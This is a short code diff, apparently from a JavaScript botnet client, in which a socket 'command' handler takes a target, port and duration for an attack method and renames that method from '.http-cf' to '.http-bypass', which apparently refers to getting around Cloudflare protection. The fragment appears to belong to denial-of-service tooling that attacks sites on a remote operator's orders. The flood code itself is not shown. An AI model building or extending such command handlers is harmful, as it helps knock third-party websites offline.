@@ -11,7 +11,7 @@ socket.on("command", (data) => {
     console.log("Command received:", data);
 
     // HTTP-BYPASS 
-    if (data.details && data.details.method === ".http-cf") {
+    if (data.details && data.details.method === ".http-bypass") {
         const target = data.details.target;
         const port = data.details.port;
         const time = data.details.time;
